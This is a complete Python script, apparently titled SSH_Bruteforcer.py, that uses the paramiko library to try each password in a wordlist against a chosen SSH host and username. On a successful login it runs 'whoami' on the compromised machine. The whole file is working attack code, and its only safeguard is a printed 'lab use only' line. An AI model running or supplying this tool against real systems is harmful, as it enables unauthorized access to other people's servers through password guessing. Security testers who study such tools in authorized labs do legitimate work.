#!/usr/bin/env python3

import sys
import paramiko
import socket

def main():
    if len(sys.argv) < 4:
        print("Usage: python3 SSH_Bruteforcer.py <SSH_host> <username> <passwords-file> [port]")
        sys.exit(1)

    host = sys.argv[1]
    username = sys.argv[2]
    pwfile = sys.argv[3]
    port = int(sys.argv[4]) if len(sys.argv) >= 5 else 22

    try:
        with open(pwfile, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Could not read password file: {e}")
        sys.exit(1)

    print(f"[*] Starting brute force against {host}:{port} as user '{username}' (lab use only)")

    for pw in passwords:
        print(f"[-] Trying: {pw}")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=pw,
                timeout=5,
                allow_agent=False,
                look_for_keys=False,
            )
        except paramiko.AuthenticationException:
            client.close()
            continue
        except (paramiko.SSHException, socket.error) as e:
            print(f"[!] Connection error while trying '{pw}': {e}")
            client.close()
            continue
        else:
            print(f"[+] Success: username='{username}' password='{pw}'")
            try:
                stdin, stdout, stderr = client.exec_command("whoami")
                out = stdout.read().decode().strip()
                if out:
                    print(f"[+] whoami -> {out}")
            except Exception:
                pass
            client.close()
            sys.exit(0)

    print("[!] Done. No valid password found in the provided list.")

if __name__ == "__main__":
    main()
